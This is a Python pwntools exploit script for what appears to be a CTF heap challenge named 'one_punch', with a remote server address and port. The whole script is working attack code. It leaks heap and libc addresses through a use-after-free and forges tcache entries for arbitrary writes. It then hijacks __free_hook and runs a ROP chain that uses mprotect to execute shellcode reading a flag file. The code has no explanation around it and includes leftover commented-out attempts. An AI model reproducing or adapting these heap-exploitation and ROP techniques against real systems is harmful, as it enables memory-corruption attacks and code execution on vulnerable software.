from pwn import *
import sys
import time

OPTIONS = {
        'binary' : './one_punch',
        'server' : '52.198.120.1',
        'port' : 48763,
        'libc': None
}

def alloc(idx, data):
  r.sendline("1")
  r.recvuntil("idx:")
  r.sendline(str(idx))
  r.recvuntil("name:")
  r.send(data)
  r.recvuntil(">")

def edit(idx, data):
  r.sendline("2")
  r.recvuntil("idx:")
  r.sendline(str(idx))
  r.recvuntil("name:")
  r.send(data)
  r.recvuntil(">")

def view(idx):
  r.sendline("3")
  r.recvuntil("idx:")
  r.sendline(str(idx))
  return r.recvuntil(">")

def free(idx):
  r.sendline("4")
  r.recvuntil("idx:")
  r.sendline(str(idx))
  r.recvuntil(">")

def secret(deet):
    r.sendline('50056')
    r.send(deet)
    r.recvuntil('>')

def exploit(r):
    r.recvuntil(">")

    alloc(0, "Z"*0x191)
    alloc(1, "Z"*0x217)
    alloc(2, "Z"*0x191)

    free(0)
    free(2)
    
    leak = u64(view(2).split("name: ")[1][:6].ljust(8, "\x00"))
    heap = leak
    print hex(leak)

    for i in range(8):
      edit(1, "C"*0x10)
      free(1)

    leak = u64(view(1).split("name: ")[1][:6].ljust(8, "\x00"))
    libc = leak
    libcbase = libc - 0x1e4ca0
    print hex(libcbase)
    mallochook = 0x1e4c30 + libcbase
    freehook = 0x1e75a8 + libcbase
    system = 0x52fd0 + libcbase

    #Massage the heap

    alloc(0, "C"*0xf1)
    for m in range(6):
        edit(0, "C"*0x10)
        free(0)


    alloc(0, "A"*0x350)
    alloc(1, "B"*0x350)

    for m in range(8):
        edit(0, "B"*0x10)
        free(0)

    alloc(1, "A"*0x250)
    alloc(1, "A"*0x250)

    alloc(2, "E"*0x350)
    alloc(1, "E"*0x350)

    edit(2, "B"*0x10)
    free(2)

    alloc(1, "A"*0x250)
    alloc(1, "A"*0x250)


    edit(2, "\x00"*0x250 + p64(0x0) + p64(0x101) + p64(heap - 0x260 + 0xa10) + p64(heap - 0x260 + 32 - 5))

    alloc(1, "F"*0xf1)

    top_chunk = libcbase + 0x1e4ca0

    secret(p64(top_chunk-0x10))
    secret("AAAA")

    secret(p64(0x0)*2 + p64(heap-0x260) + p64(0x0))

    alloc(1, "A"*0x180)

    topchunk = 0x1e4ca0 + libcbase
    environ = libcbase + 0x1e7d60

    def dowrite(addr, data):


      fake_tcache = p64(0x0)*4 + p64(0x7f) + p64(0x0) + p64(0x0)*28 + p64(0x0)*6 + p64(addr) + p64(0x0)*7 #Just edit tcache for arb chunks


      edit(1, fake_tcache)
      secret(data)

    gadget = libcbase + 0x43cc0 
    libcputs = 0x83cc0 + libcbase
    libcmalloc = 0x98a40 + libcbase
    stdout = libcbase + 0x1e5760
    cookloc = libcbase + 0x1ec530
    leaveret = libcbase + 0x0000000000058373+1

    def rol(val):
      return (val & 9007199254740991) << 0x11 | val >> (64-0x11)
    print(hex(rol(0x4141414141414141)))
      

    ropchain = heap + 0xe80
    payload = [0]*(0x100/8)
    payload[0x30/8] = rol(ropchain + 24)
    print(hex(payload[0x30/8]))
    payload[0x38/8] = rol(leaveret)
    print(hex(payload[0x38/8]))
    shits = ""
    for i in payload:
      shits += p64(i)
    edit(0, shits)#fakeshit

    context.arch = "amd64"
    context.bits = 64

    libcmprotect = 0x117590 + libcbase
    poprdi = 0x0000000000026542 + libcbase
    poprsi = 0x0000000000026f9e + libcbase
    poprdx = 0x000000000012bda6 + libcbase
    path = "/home/alex/flag.txt\x00\x00\x00\x00\x00"
    rop = path
    rop += p64(poprdi) + p64(ropchain+0x70 & 0xfffffffffffff000)
    rop += p64(poprsi) + p64(0x1000)
    rop += p64(poprdx) + p64(0x7)
    rop += p64(libcmprotect)
    rop += p64(ropchain + 0x70)
    rop += "\x90"*(0x70 - len(rop))

    shellcode = shellcraft.open("/home/alex/flag.txt")
    shellcode += shellcraft.read("rax", "rsp", 32)
    shellcode += shellcraft.write(1, "rsp", 32)

    print shellcode

    rop += asm(shellcode)
    edit(2, rop)# ropchain


    dowrite(freehook, p64(gadget))
    print hex(gadget)
    dowrite(cookloc-0x8, p64(0x0)*2)


    #dowrite(environ - 0x30 + 0x8, p64(0x7f7f))
    #dowrite(topchunk, p64(environ - 0x30))

    #alloc(0, "A"*(0x30))
    #dowrite(stdout, p64(0xfbad1800) + (p64(0x0*3) + p64(environ+0x8) + p64(environ))*2)





#     alloc(1, "A"*0x217)

    # alloc(0, "B"*0x217)
    # alloc(1, "B"*0x217)
    # alloc(2, "B"*0x217)

    # alloc(1, "B"*0x217)

    # free(0)
    # free(2)

    # alloc(1, "C"*0x300)




    # r.sendline('50056')
    # r.sendline('AAAA')
    # r.recvuntil('>')

    # global_max_fast = libcbase + 0x1e7600

    # edit(2, p64(heap-0x260 + 0x7b0) + p64(global_max_fast-0x10))

    # alloc(1, "D"*0x217)

    # pause()

    # alloc(0, "A"*0x261)


    r.interactive()



if __name__ == "__main__":
        binary = ELF(OPTIONS['binary'], checksec=False)
        if OPTIONS['libc'] != None:
                libc = ELF(OPTIONS['libc'], checksec=False)     
        else:
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        if args['REMOTE'] == '1':
                r = remote(OPTIONS['server'], OPTIONS['port'])
                exploit(r)
        else:
                r = process(OPTIONS['binary'])
                exploit(r)
